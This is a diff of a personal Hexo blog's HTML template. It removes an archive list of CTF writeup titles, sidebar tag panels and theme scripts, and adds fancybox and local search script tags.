-        <li class="archive-post-item">
-            <span class="archive-post-date">03/27</span>
-            <a class="archive-post-title" href="/2024/03/27/nkctf-wp/">nkctf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span>
-            <a class="archive-post-title" href="/2024/03/10/pearlctf-wp/">pearlctf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span>
-            <a class="archive-post-title" href="/2024/03/04/osu-gaming-CTF-2024/">osu!gaming_CTF_2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/25</span>
-            <a class="archive-post-title" href="/2024/02/25/sictfr3-pwn-wp/">sictfr3_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/14</span>
-            <a class="archive-post-title" href="/2024/02/14/nssr18-wp/">nssr18_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/31</span>
-            <a class="archive-post-title" href="/2024/01/31/rw%E4%BD%93%E9%AA%8C%E8%B5%9Bwp/">rw体验赛wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/26</span>
-            <a class="archive-post-title" href="/2024/01/26/nssctfr16-wp/">nssctfr16_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/24</span>
-            <a class="archive-post-title" href="/2024/01/24/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bwp/">春秋杯冬季赛wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/19</span>
-            <a class="archive-post-title" href="/2024/01/19/pwnable-tw/">pwnable.tw</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/18</span>
-            <a class="archive-post-title" href="/2024/01/18/uoftctf-pwn-wp/">uoftctf_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/04</span>
-            <a class="archive-post-title" href="/2024/01/04/pwnable-kr/">pwnable.kr</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2023 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/moectf-wp/">moectf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">php弱类型</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/">python3-venv虚拟环境使用-解决包管理版本控制混乱的问题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/sictf2023r2/">sictf2023</a>
-        </li>
-    
-    </div>
-</div>
-
-        <div class="sidebar-panel-tags">
-    <div class="sidebar-tags-name">
-        
-            <span class="sidebar-tag-name" data-tags="ctf writeup">
-                <span class="iconfont-archer">&#xe606;</span>
-                ctf writeup
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="misc">
-                <span class="iconfont-archer">&#xe606;</span>
-                misc
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="os">
-                <span class="iconfont-archer">&#xe606;</span>
-                os
-            </span>
-        
-    </div>
-    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
-    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
-        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
-    </div> 
-    <div class="sidebar-tags-list"></div>
-</div>
-
-        <div class="sidebar-panel-categories">
-    <div class="sidebar-categories-name">
-    
-    </div>
-    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
-    <div class="sidebar-categories-list"></div>
-</div>
-
-    </div>
-</div>
-
-        <!-- site-meta -->
-        <script>
-    var siteMetaRoot = "/"
-    if (siteMetaRoot === "undefined") {
-        siteMetaRoot = '/'
-    }
-    var siteMeta = {
-        url: "https://nyyyddddn.github.io",
-        root: siteMetaRoot,
-        author: "nyyyddddn"
-    }
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
 </script>
 
-        <!-- import experimental options here -->
-        <!-- Custom Font -->
 
 
-        <!-- main func -->
-        <script src="/scripts/main.js?v=20211217"></script>
-        <!-- dark mode -->
-        <script src="/scripts/dark.js?v=20211217"></script>
-        <!-- fancybox -->
-        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
-        <!-- algolia -->
-        
-        <!-- busuanzi -->
-        
-            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
-        
-        <!-- CNZZ -->
-        
-        <!-- async load share.js -->
-        
-            <script src="/scripts/share.js?v=20211217" async></script>
-        
-        <!-- mermaid -->
-        
-    </body>
-</html>
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
